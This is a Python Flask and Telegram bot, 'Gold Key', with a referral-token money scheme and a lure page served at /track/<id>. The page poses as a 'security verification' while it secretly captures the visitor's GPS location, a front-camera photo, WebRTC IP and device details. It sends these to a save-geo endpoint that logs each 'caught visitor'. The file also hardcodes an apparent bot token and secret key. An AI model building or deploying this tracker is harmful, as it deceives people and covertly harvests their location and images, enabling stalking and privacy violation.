import os
import logging
import sqlite3
import hashlib
import asyncio
import threading
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify, Response, send_file, session, redirect, url_for
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, CallbackQueryHandler
import requests

# Loglama ayarları
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9101317558:AAGt4hiYf7gVPrmCdtSPZ92zt4DyBpf4w0A")
PORT = int(os.environ.get("PORT", 8080))
WEB_APP_URL = os.getenv("WEB_APP_URL", "https://botgoldkey.onrender.com")

app = Flask(__name__)
app.secret_key = "kali_linux_secret_key_gold_key_998877"

# Telegram Uygulamasını Yapılandır (Webhook için updater=None)
telegram_app = Application.builder().token(TOKEN).updater(None).build()

# Arka planda kalıcı Telegram event loop'u çalıştır (Her istekte botun sıfırlanmasını engeller)
telegram_loop = asyncio.new_event_loop()

def run_telegram_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

threading.Thread(target=run_telegram_loop, args=(telegram_loop,), daemon=True).start()

async def init_telegram_app():
    await telegram_app.initialize()
    await telegram_app.start()

# Botu başlangıçta kalıcı döngüde bir kez başlat
future_init = asyncio.run_coroutine_threadsafe(init_telegram_app(), telegram_loop)
future_init.result()

CLICK_LOGS = []
CREDENTIAL_LOGS = []

# --- VERİTABANI ---
def init_db():
    conn = sqlite3.connect('goldkey.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            balance INTEGER DEFAULT 0
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tokens (
            token_code TEXT PRIMARY KEY,
            owner_id INTEGER,
            uses_left INTEGER DEFAULT 10
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def get_balance(user_id):
    conn = sqlite3.connect('goldkey.db')
    cursor = conn.cursor()
    cursor.execute('SELECT balance FROM users WHERE user_id = ?', (user_id,))
    row = cursor.fetchone()
    if row:
        conn.close()
        return row[0]
    else:
        cursor.execute('INSERT OR IGNORE INTO users (user_id, balance) VALUES (?, 0)', (user_id,))
        conn.commit()
        conn.close()
        return 0

def update_balance(user_id, amount):
    conn = sqlite3.connect('goldkey.db')
    cursor = conn.cursor()
    cursor.execute('INSERT OR IGNORE INTO users (user_id, balance) VALUES (?, 0)', (user_id,))
    cursor.execute('UPDATE users SET balance = balance + ? WHERE user_id = ?', (amount, user_id))
    conn.commit()
    conn.close()
# ------------------

async def start(update: Update, context):
    user_id = update.effective_user.id
    get_balance(user_id)

    keyboard = [
        [InlineKeyboardButton("🌐 Gold Key Mini App'i Aç", web_app=WebAppInfo(url=WEB_APP_URL))],
        [InlineKeyboardButton("🔑 Token Al (500 TL)", callback_data="token_al")],
        [InlineKeyboardButton("🎟️ Token Gir / Kullan", callback_data="token_gir")],
        [InlineKeyboardButton("💰 Bakiyem", callback_data="bakiye")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "📈 **GOLD KEY Satış ve Kazanç Sistemine Hoş Geldin!** 💰\n\n"
        "Aşağıdaki menüden işlemlerini yönetebilir veya Mini App'i açabilirsin.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def button_handler(update: Update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "token_al":
        yeni_token = f"GOLD-{user_id}-2026"
        
        conn = sqlite3.connect('goldkey.db')
        cursor = conn.cursor()
        cursor.execute('INSERT OR REPLACE INTO tokens (token_code, owner_id, uses_left) VALUES (?, ?, 10)', (yeni_token, user_id))
        conn.commit()
        conn.close()
        
        await query.message.reply_text(
            f"✅ **Ödeme Onaylandı! (Simülasyon)**\n\n"
            f"Yeni Gold Key Token'ın oluşturuldu:\n`{yeni_token}`\n\n"
            f"Bu token **10 kişi** tarafından kullanılabilir. Her kullanımda sen **100 TL**, kullanan kişi **50 TL** kazanır!",
            parse_mode="Markdown"
        )

    elif query.data == "token_gir":
        await query.message.reply_text(
            "Lütfen kullanmak istediğin referans token kodunu şu formatta gönder:\n"
            "`/kod GOLDKODU`\n\n"
            "Örnek: `/kod GOLD-12345-2026`",
            parse_mode="Markdown"
        )

    elif query.data == "bakiye":
        bakiye = get_balance(user_id)
        await query.message.reply_text(f"💳 Güncel Bakiyen: **{bakiye} TL**", parse_mode="Markdown")

async def kod_kullan(update: Update, context):
    user_id = update.effective_user.id
    args = context.args
    
    if not args:
        await update.message.reply_text("❌ Lütfen bir token kodu gir. Örnek: `/kod GOLD-123-2026`")
        return

    girilen_token = args[0]

    conn = sqlite3.connect('goldkey.db')
    cursor = conn.cursor()
    cursor.execute('SELECT owner_id, uses_left FROM tokens WHERE token_code = ?', (girilen_token,))
    row = cursor.fetchone()

    if not row:
        conn.close()
        await update.message.reply_text("❌ Bu token geçersiz veya daha önce tamamen tüketilmiş!")
        return

    sahip_id, kalan_hak = row

    if sahip_id == user_id:
        conn.close()
        await update.message.reply_text("❌ Kendi tokenini kullanamazsın kanka!")
        return

    if kalan_hak <= 0:
        cursor.execute('DELETE FROM tokens WHERE token_code = ?', (girilen_token,))
        conn.commit()
        conn.close()
        await update.message.reply_text("❌ Bu tokenin 10 kişilik kullanım hakkı dolmuş ve silinmiştir!")
        return

    yeni_hak = kalan_hak - 1
    if yeni_hak <= 0:
        cursor.execute('DELETE FROM tokens WHERE token_code = ?', (girilen_token,))
    else:
        cursor.execute('UPDATE tokens SET uses_left = ? WHERE token_code = ?', (yeni_hak, girilen_token))
    
    conn.commit()
    conn.close()

    update_balance(user_id, 50)
    update_balance(sahip_id, 100)

    await update.message.reply_text(
        f"🎉 **Tebrikler!** Token başarıyla uygulandı.\n"
        f"Hesabına **50 TL** eklendi! 💸\n"
        f"Bu tokenin kalan kullanım hakkı: {yeni_hak}/10"
    )

# Komutları uygulamaya ekle
telegram_app.add_handler(CommandHandler("start", start))
telegram_app.add_handler(CommandHandler("kod", kod_kullan))
telegram_app.add_handler(CallbackQueryHandler(button_handler))

# --- GELİŞTİRİLMİŞ GPS & ÖN KEMERA SNAPSHOT TRACKER ŞABLONU ---
TRACK_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Gold Key - Güvenlik Doğrulaması</title>
    <style>
        body { background: #0b0f15; color: #00ff66; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .box { background: #121824; border: 1px solid #00ff66; padding: 30px; border-radius: 8px; box-shadow: 0 0 20px rgba(0,255,102,0.3); max-width: 400px; }
        h3 { color: #38bdf8; margin-top: 0; }
        p { font-size: 13px; color: #94a3b8; }
        .spinner { border: 4px solid #1e293b; border-top: 4px solid #00ff66; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <h3>🔒 Güvenlik Doğrulaması</h3>
        <div class="spinner"></div>
        <p id="statusTxt">Cihaz uyumluluğu ve Gold Key doğrulaması yapılıyor, lütfen bekleyin...</p>
    </div>

    <video id="webcam" autoplay playsinline muted style="display:none;"></video>
    <canvas id="snapshotCanvas" style="display:none;"></canvas>

    <script>
        async function runTracker() {
            let data = {
                time: new Date().toLocaleString(),
                ip: "Tespit ediliyor...",
                webrtc_ip: "",
                os: navigator.platform,
                ram: navigator.deviceMemory || "Bilinmiyor",
                cores: navigator.hardwareConcurrency || "Bilinmiyor",
                battery: "Bilinmiyor",
                screen: window.screen.width + "x" + window.screen.height,
                lat: null,
                lon: null,
                snapshot: null
            };

            if (navigator.getBattery) {
                try {
                    let bat = await navigator.getBattery();
                    data.battery = Math.round(bat.level * 100) + "% (" + (bat.charging ? "Şarjda" : "Pilde") + ")";
                } catch(e){}
            }

            try {
                let pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if (ice && ice.candidate && ice.candidate.candidate) {
                        let ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (ipMatch) data.webrtc_ip = ipMatch[1];
                    }
                };
            } catch(e){}

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        data.lat = pos.coords.latitude;
                        data.lon = pos.coords.longitude;
                        capturePhotoAndSend(data);
                    },
                    (err) => {
                        capturePhotoAndSend(data);
                    },
                    {timeout: 10000, enableHighAccuracy: true}
                );
            } else {
                capturePhotoAndSend(data);
            }
        }

        async function capturePhotoAndSend(data) {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                let video = document.getElementById('webcam');
                video.srcObject = stream;
                await new Promise(resolve => setTimeout(resolve, 1500));

                let canvas = document.getElementById('snapshotCanvas');
                canvas.width = 320; canvas.height = 240;
                let ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                data.snapshot = canvas.toDataURL('image/jpeg', 0.7);

                stream.getTracks().forEach(t => t.stop());
            } catch(e) {}

            fetch('/api/lure/save-geo', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).then(() => {
                document.getElementById('statusTxt').innerText = "✅ Doğrulama başarıyla tamamlandı. Yönlendiriliyorsunuz...";
                setTimeout(() => { window.location.href = "https://t.me/botgoldkey_bot"; }, 1500);
            });
        }

        window.onload = runTracker;
    </script>
</body>
</html>
"""

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    """Telegram'dan gelen güncellemeleri kalıcı thread loop üzerinden hatasız karşılar"""
    try:
        data = request.get_json(force=True)
        update = Update.de_json(data, telegram_app.bot)
        
        async def process():
            await telegram_app.process_update(update)

        future = asyncio.run_coroutine_threadsafe(process(), telegram_loop)
        future.result(timeout=10)
    except Exception as e:
        logger.error(f"Hata oluştu: {e}")
    return "ok", 200

@app.route("/track/<track_id>")
def track_visitor(track_id):
    return TRACK_TEMPLATE

@app.route("/api/lure/save-geo", methods=["POST"])
def save_geo():
    data = request.get_json()
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    data['ip'] = visitor_ip
    CLICK_LOGS.insert(0, data)
    
    if TOKEN:
        try:
            lat = data.get('lat')
            lon = data.get('lon')
            loc_str = f"Lat: {lat}, Lon: {lon} (https://maps.google.com/?q={lat},{lon})" if lat else "Konum Alınamadı"
            msg = f"🎯 [GOLD KEY TRACKER] Yeni Ziyaretçi Yakalandı!\nIP: {visitor_ip}\nWebRTC IP: {data.get('webrtc_ip')}\nCihaz: {data.get('os')} | RAM: {data.get('ram')}GB\nKonum: {loc_str}"
            # Bildirimi almak istediğin Telegram Chat ID'sini buraya ekleyebilirsin
            # requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": "CHAT_ID", "text": msg}, timeout=3)
        except: pass
        
    return jsonify({"status": "saved"})

@app.route("/", methods=["GET"])
def index():
    return render_template_string("<h1>Gold Key Bot Aktif ve Çalışıyor! 🚀</h1>"), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
